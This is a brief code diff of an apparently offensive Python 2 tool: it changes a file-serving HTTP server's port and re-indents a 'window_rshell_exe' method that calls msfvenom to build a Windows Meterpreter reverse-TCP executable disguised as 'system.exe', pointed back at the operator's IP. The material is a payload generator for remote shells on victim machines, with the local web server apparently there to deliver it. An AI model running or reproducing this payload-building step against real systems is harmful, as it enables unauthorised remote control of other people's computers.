@@ -16,7 +16,7 @@ from sets import Set
 
 
 try:
-	PORT = 8080
+	PORT = 1221
 	Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
 	httpd = SocketServer.TCPServer(("", PORT), Handler)
 	print "Serving up server on port", PORT
@@ -46,8 +46,9 @@ class payloads:
         pass
 
     def window_rshell_exe(self, local_ip):
-	""" Creates windows reverse shell.  Arg=local_ip """
-	cmd = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="+local_ip+" > X > system.exe"
-	os.system(cmd)
+
+		""" Creates windows reverse shell.  Arg=local_ip """
+		cmd = "msfvenom -p windows/meterpreter/reverse_tcp LHOST="+local_ip+" > X > system.exe"
+		os.system(cmd)
 
 
